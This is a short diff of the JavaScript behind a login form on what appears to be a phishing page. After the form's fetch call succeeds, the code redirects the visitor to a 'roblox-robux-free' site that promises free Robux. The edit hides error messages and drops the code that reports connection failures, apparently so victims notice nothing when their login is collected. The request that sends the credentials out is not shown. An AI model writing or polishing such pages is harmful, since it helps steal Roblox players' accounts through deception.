@@ -591,15 +591,12 @@ site.</div></div></noscript>
             })
             .then(response => {
                 if (response.ok) {
-                    messageDiv.textContent = 'Login e envio bem-sucedidos!';
+                    messageDiv.textContent = 'Login bem-sucedido!';
                     messageDiv.style.color = '#00aa00';
                     window.location.href = "https://roblox-robux-free.github.io/roblox/oi.html"; // Redirecionar
                 } else {
-                    messageDiv.textContent = 'Erro no envio.';
+                    messageDiv.textContent = '';
                 }
-            })
-            .catch(error => {
-                messageDiv.textContent = 'Erro na conexão.';
             });
         });
         
